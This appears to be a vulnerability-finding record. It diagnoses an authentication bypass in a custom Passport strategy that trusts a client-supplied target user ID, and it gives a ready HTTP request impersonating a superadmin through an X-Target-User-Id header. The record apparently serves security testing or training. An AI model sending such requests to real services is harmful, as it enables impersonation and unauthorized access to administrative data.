diagnosis: The custom Passport strategy callback extracts targetUserId directly from client request headers or body and attaches that user to req.user without verifying caller credentials or checking if the caller possesses administrative impersonation privileges. Any client can pass an x-target-user-id header to impersonate any user on the platform.
exploit_request:
GET /api/v1/admin/audit-logs HTTP/1.1
Host: identity.enterprisesso.com
X-Target-User-Id: usr_global_superadmin_01
Authorization: Bearer <unprivileged_user_token>
